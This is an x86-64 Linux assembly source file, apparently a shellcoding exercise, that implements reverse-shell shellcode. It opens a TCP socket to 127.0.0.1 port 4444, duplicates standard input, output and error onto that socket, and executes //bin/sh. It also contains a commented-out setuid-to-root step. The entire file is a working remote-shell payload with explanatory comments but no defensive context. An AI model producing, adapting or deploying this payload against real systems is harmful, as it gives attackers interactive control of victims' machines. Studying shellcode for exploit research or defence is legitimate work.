global _start

section .text
_start:
	; socket syscall: int socket(int domain, int type, int protocol)
	; using push/pop to both clear and set registers
	push 41
	pop rax		    	; syscall =  socket
	push 2
	pop rdi		    	; domain = AF_INET
	push 1
	pop rsi		    	; type = SOCK_STREAM
	cqo                 ; protocol = single, since rdx is cleared to 0
	syscall

	; connect syscall: int connect(int sockfd, const struct sockaddr *addr{sin_family, sin_port, sin_addr}, socklen_t addrlen);
	mov edi, eax		; sockfd = 32 bit file descriptor returned from socket syscall
	mov al, 42		    ; syscall = connect
	push rdx		    ; pad 8 bytes to align with sockaddr
	push dword 0x0100007F	; sin_addr = 127.0.0.1, reversed for little endian
	push word 0x5c11	; sin_port = 4444, reversed for little endian
	push word 2		    ; sin_family = AF_INET
	mov rsi, rsp		; sockaddr = structure in the stack
	mov dl, 16		    ; addrlen = 16 bytes
	syscall

	; dup2 syscall: int dup2(int oldfd, int newfd)
	xor rsi, rsi		; rsi as both loop counter and newfd to redirect stdin(0), stdout(1) and stderr(2)

dup2Loop:
	mov al, 33		    ; syscall = dup2
	syscall		    	; oldfd is unchanged in rdi, set previously
	inc sil		    	; increment sil
	cmp sil, 3		    ; compare sil to 3
	jl dup2Loop		    ; loop again if sil < 3

	; setuid syscall: int setuid(uid_t uid)
	; set uid to root, commented out since the shell won't work if the account executing is not root
	;mov al, 105		; syscall = setuid
	;xor rdi, rdi		; uid = 0 - root
	;syscall
	
	; execve syscall: int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
	mov al, 59		    ; syscall = execve
	push 0			    ; push NULL string terminalor
	mov rdi,  0x68732f6e69622f2f	; pathname = '//bin/sh' reversed for little endian
	push rdi		    ; push string to stack
	mov rdi, rsp		; set first arg to pathname pointer
	push 0			
	mov rsi, rsp		; set second arg to pathname pointer
	mov dl, 0	    	; envp = NULL 
	syscall